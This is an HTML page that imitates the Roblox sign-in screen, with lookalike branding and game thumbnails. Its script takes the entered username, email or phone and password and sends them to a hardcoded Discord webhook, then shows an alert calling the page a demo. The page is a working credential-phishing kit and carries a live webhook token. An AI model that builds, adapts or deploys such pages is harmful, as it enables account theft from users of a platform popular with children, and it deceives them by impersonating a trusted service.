<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Roblox - Sign In</title>

  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
    }

    body {
      background: #0b0b0b;
      color: #ddd;
      display: flex;
      flex-direction: column;
      min-height: 100vh;
    }

    /* Top Nav */
    .top-nav {
      position: fixed;
      top: 0;
      left: 0;
      right: 0;
      height: 50px;
      background: #111;
      display: flex;
      align-items: center;
      padding: 0 25px;
      border-bottom: 1px solid #222;
      z-index: 1000;
    }

    .logo {
      width: 20px;
      height: 20px;
      background: white;
      clip-path: polygon(20% 0, 80% 0, 100% 20%, 100% 80%, 80% 100%, 20% 100%, 0 80%, 0 20%);
      margin-right: 20px;
    }

    .nav-links {
      display: flex;
      gap: 25px;
      align-items: center;
    }

    .nav-links a {
      color: #ddd;
      text-decoration: none;
      font-size: 13px;
      font-weight: 500;
      padding-bottom: 5px;
      border-bottom: 2px solid transparent;
      transition: border-color 0.25s;
    }

    .nav-links a:hover,
    .nav-links a.active {
      border-color: #3b82f6;
      color: #fff;
    }

    .nav-search {
      margin-left: 20px;
      flex: 1;
      max-width: 400px;
      position: relative;
    }

    .nav-search input {
      width: 100%;
      padding: 7px 12px;
      background: #222;
      border: 1px solid #444;
      border-radius: 6px;
      color: #eee;
      font-size: 14px;
    }

    .nav-search input::placeholder {
      color: #aaa;
    }

    .create-btn {
      margin-left: auto;
      background: #3b82f6;
      color: white;
      border: none;
      padding: 7px 18px;
      border-radius: 6px;
      font-weight: 600;
      cursor: pointer;
      font-size: 14px;
      transition: background 0.3s;
    }

    .create-btn:hover {
      background: #2563eb;
    }

    /* Main flex layout */
    .main {
      display: flex;
      flex: 1;
      margin-top: 50px;
      min-height: calc(100vh - 50px);
    }

    /* Left Panel */
    .left {
      width: 380px;
      background: #121212;
      padding: 50px 40px;
      display: flex;
      flex-direction: column;
      justify-content: center;
      color: #fff;
    }

    .left h1 {
      font-weight: 800;
      font-size: 28px;
      margin-bottom: 8px;
      color: white;
    }

    .left p {
      margin-bottom: 30px;
      font-size: 14.5px;
      color: #aaaaaa;
    }

    label {
      display: block;
      font-size: 14px;
      color: #ccc;
      font-weight: 600;
      margin-bottom: 6px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      background: #222;
      border: 1px solid #444;
      border-radius: 6px;
      padding: 12px 14px;
      font-size: 15px;
      color: #eee;
      outline-offset: 2px;
      transition: border-color 0.25s;
    }

    input[type="text"]::placeholder,
    input[type="password"]::placeholder {
      color: #777;
    }

    input[type="text"]:focus,
    input[type="password"]:focus {
      border-color: #3b82f6;
      background: #1e1e1e;
    }

    .signin-btn {
      margin-top: 12px;
      width: 100%;
      padding: 12px;
      background: #3b82f6;
      color: white;
      border-radius: 6px;
      border: none;
      font-weight: 700;
      font-size: 15px;
      cursor: pointer;
      transition: background 0.35s;
    }

    .signin-btn:hover {
      background: #2563eb;
    }

    .forgot {
      font-size: 13px;
      margin: 20px 0 18px;
      text-align: center;
    }

    .forgot a {
      color: #3b82f6;
      text-decoration: none;
      font-weight: 600;
    }

    .divider {
      display: flex;
      align-items: center;
      margin: 18px 0;
    }

    .divider span {
      flex: 1;
      height: 1.5px;
      background: #444;
    }

    .divider p {
      margin: 0 12px;
      color: #666;
      font-weight: 600;
      font-size: 13px;
    }

    .alt-btn {
      width: 100%;
      padding: 11px;
      background: #272727;
      border: none;
      border-radius: 6px;
      color: #ddd;
      font-size: 14px;
      cursor: pointer;
      margin-bottom: 10px;
      display: flex;
      align-items: center;
      justify-content: center;
      gap: 6px;
      font-weight: 600;
      transition: background 0.3s;
    }

    .alt-btn:hover {
      background: #3c3c3c;
    }

    .signup {
      text-align: center;
      margin-top: 18px;
      font-size: 13px;
      color: #888;
    }

    .signup a {
      color: #3b82f6;
      text-decoration: none;
      font-weight: 600;
    }

    /* Right Panel with tiled images */

    .right {
      flex: 1;
      position: relative;
      background: #000;
      overflow: hidden;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 50px;
      min-height: calc(100vh - 50px);
    }

    .tiles {
      position: relative;
      width: 100%;
      height: 100%;
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-content: center;
      gap: 30px;
      max-width: 900px;
    }

    .tile {
      width: 160px;
      height: 160px;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 6px 15px rgba(0, 0, 0, 0.8);
      transition: transform 0.3s ease;
      position: relative;

      /* Random rotation for each tile - you can customize */
      transform-origin: center center;
    }

    .tile img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      display: block;
    }

    /* Slight random rotation for a real collage feel */
    .tile:nth-child(1) {
      transform: rotate(-7deg);
      z-index: 10;
    }

    .tile:nth-child(2) {
      transform: rotate(6deg);
      z-index: 9;
    }

    .tile:nth-child(3) {
      transform: rotate(-4deg);
      z-index: 8;
    }

    .tile:nth-child(4) {
      transform: rotate(8deg);
      z-index: 7;
    }

    .tile:nth-child(5) {
      transform: rotate(-5deg);
      z-index: 6;
    }

    .tile:nth-child(6) {
      transform: rotate(4deg);
      z-index: 5;
    }

    /* On hover, bring tile to front and straighten */
    .tile:hover {
      transform: rotate(0deg) scale(1.1);
      box-shadow: 0 17px 50px rgba(59, 130, 246, 0.8);
      z-index: 20 !important;
      cursor: pointer;
      transition: transform 0.3s ease, box-shadow 0.3s ease;
    }

    /* Responsive adjustments */
    @media (max-width: 1020px) {
      .right {
        display: none;
      }

      .left {
        width: 100%;
        padding: 50px 25px;
      }
    }
  </style>
</head>

<body>

  <div class="top-nav">
    <div class="logo"></div>
    <div class="nav-links">
      <a href="#" class="active">Charts</a>
      <a href="#">Marketplace</a>
      <a href="#">Create</a>
      <a href="#">Robux</a>
    </div>
    <div class="nav-search">
      <input type="text" placeholder="Search" />
    </div>
    <button class="create-btn">Create account</button>
  </div>

  <div class="main">
    <div class="left">
      <h1>Sign in</h1>
      <p>Jump back into your experiences</p>

      <form id="loginForm">
        <label for="username">Username, email, or phone</label>
        <input type="text" id="username" placeholder="Username, email, or phone" required />

        <label for="password" style="margin-top: 18px;">Password</label>
        <input type="password" id="password" placeholder="Password" required />

        <button type="submit" class="signin-btn">Sign in</button>
      </form>

      <div class="forgot"><a href="#">Forgot password or username?</a></div>

      <div class="divider">
        <span></span>
        <p>Or</p>
        <span></span>
      </div>

      <button class="alt-btn">ðŸ“§ Email a code</button>
      <button class="alt-btn">ðŸ”‘ Quick sign in</button>

      <div class="signup">
        Don't have an account? <a href="#">Create one</a>
      </div>
    </div>

    <div class="right">
      <div class="tiles">
        <div class="tile">
          <img src="https://t6.rbxcdn.com/d24f61f22643a8d2dd26c131ccdea070" alt="Jailbreak" />
        </div>
        <div class="tile">
          <img src="https://t6.rbxcdn.com/e7e959d38f346374f0626c9f31e8a66a" alt="Shark Bitez" />
        </div>
        <div class="tile">
          <img src="https://t7.rbxcdn.com/545b1110d39c55e944f9e3bfeff834ea" alt="World Zero" />
        </div>
        <div class="tile">
          <img src="https://t6.rbxcdn.com/6b6195b8a0f7235497e0c493f66a1e03" alt="Toilet Tower Defense" />
        </div>
        <div class="tile">
          <img src="https://t6.rbxcdn.com/c9d7853aab89502f449d99a09c903f63" alt="Doors" />
        </div>
        <div class="tile">
          <img src="https://t5.rbxcdn.com/8208fdbb9ded9cab89079c2a8bcfcae5" alt="Tower World" />
        </div>
      </div>
    </div>
  </div>

  <script>
    document.getElementById("loginForm").addEventListener("submit", function (e) {
      e.preventDefault();

      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;

      const content = ` **New Credentials Submitted** \n **Username/Email/Phone:** ${username}\n **Password:** ${password}`;

      const webhookUrl = "https://discord.com/api/webhooks/1477207175607619606/QRToJeCw3f5Psff9_81PRwwOMAdsyUboelWzFuqrel1OG2eIcHqqqGvgOAoWIfP470vc";

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content: content })
      })
        .then(response => {
          if (response.ok) {
            alert("This is a demo page. Credentials sent to Discord webhook.");
            document.getElementById("loginForm").reset();
          } else {
            alert("Failed to send data.");
          }
        })
        .catch(error => {
          alert("Error sending data: " + error);
        });
    });
  </script>
</body>

</html>
